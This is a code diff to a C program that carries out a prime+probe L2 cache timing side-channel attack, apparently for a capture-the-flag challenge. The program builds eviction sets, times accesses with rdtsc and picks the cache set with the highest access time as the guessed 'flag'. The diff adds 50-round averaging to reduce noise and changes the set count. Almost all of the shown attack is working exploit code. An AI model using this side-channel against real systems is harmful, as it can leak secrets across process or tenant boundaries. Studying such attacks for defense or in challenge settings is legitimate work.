@@ -4,7 +4,7 @@
 #include <sys/mman.h>
 #include <unistd.h>
 
-#define NUM_L2_CACHE_SETS 16384    // adjust if your L2 cache has a different number of sets
+#define NUM_L2_CACHE_SETS 1024    // adjust if your L2 cache has a different number of sets
 #define WAYS 16                  // number of ways in your L2
 
 // --- Helper functions ---
@@ -46,21 +46,30 @@ int main() {
         get_partial_eviction_set(buf, eviction_sets[i], i);
 
     while (1) {
-        uint64_t times[NUM_L2_CACHE_SETS];
+
+    int scores[NUM_L2_CACHE_SETS] = {0};
+
+    // repeat measurement multiple times to reduce noise
+    for (int r = 0; r < 50; r++) {
 
         for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-            uint64_t start = rdtsc();
-            for (int j = 0; j < WAYS; j++)
-                (*(eviction_sets[set][j]))++;
-            uint64_t end = rdtsc();
-            times[set] = end - start;
-        }
 
-        // guess flag as the set with highest access time
-        int guessed_flag = 0;
-        for (int i = 1; i < NUM_L2_CACHE_SETS; i++)
-            if (times[i] > times[guessed_flag])
-                guessed_flag = i;
+            uint64_t start = rdtsc();
+
+            volatile char tmp;
+            for (int j = 0; j < WAYS; j++)
+                tmp = *(eviction_sets[set][j]);
+
+            uint64_t end = rdtsc();
+
+            scores[set] += (end - start);
+        }
+    }
+
+    int guessed_flag = 0;
+    for (int i = 1; i < NUM_L2_CACHE_SETS; i++)
+        if (scores[i] > scores[guessed_flag])
+            guessed_flag = i;
 
         printf("Guessed flag: %d\n", guessed_flag);
         fflush(stdout);
